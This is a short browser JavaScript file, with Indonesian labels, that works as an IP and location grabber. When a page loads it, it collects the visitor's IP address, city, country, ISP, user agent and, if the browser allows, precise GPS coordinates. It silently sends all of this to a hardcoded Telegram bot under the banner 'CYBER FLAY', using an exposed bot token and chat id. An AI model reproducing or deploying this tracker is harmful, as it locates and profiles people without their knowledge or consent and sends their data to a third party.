
const result = document.getElementById("result");
const tg_token = "7130690846:AAHKdiWpIMntEvl0FNaUJjc1ymPk33hBUIg";
const chat_id = "7932600874";

async function getIPInfo() {
    const ip = await fetch("https://api.ipify.org?format=json").then(res => res.json());
    const info = await fetch("https://ipapi.co/json/").then(res => res.json());

    const ua = navigator.userAgent;
    const now = new Date().toLocaleString();

    let gpsText = "";

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
            const { latitude, longitude } = pos.coords;
            gpsText = `GPS: https://maps.google.com/?q=${latitude},${longitude}\n`;
            sendToTelegram(ip.ip, info, ua, now, gpsText);
        }, err => {
            sendToTelegram(ip.ip, info, ua, now, "(GPS tidak diizinkan)");
        });
    } else {
        sendToTelegram(ip.ip, info, ua, now, "(GPS tidak didukung)");
    }

    result.textContent = `
IP: ${ip.ip}
Kota: ${info.city}
Negara: ${info.country_name}
ISP: ${info.org}
Waktu: ${now}
Device: ${ua}
    `;
}

function sendToTelegram(ip, info, ua, time, gps) {
    const message = `
🚨 CYBER FLAY
IP: ${ip}
Kota: ${info.city}
Negara: ${info.country_name}
ISP: ${info.org}
Waktu: ${time}
User-Agent: ${ua}
${gps}
    `;
    fetch(`https://api.telegram.org/bot${tg_token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text: message })
    });
}

getIPInfo();
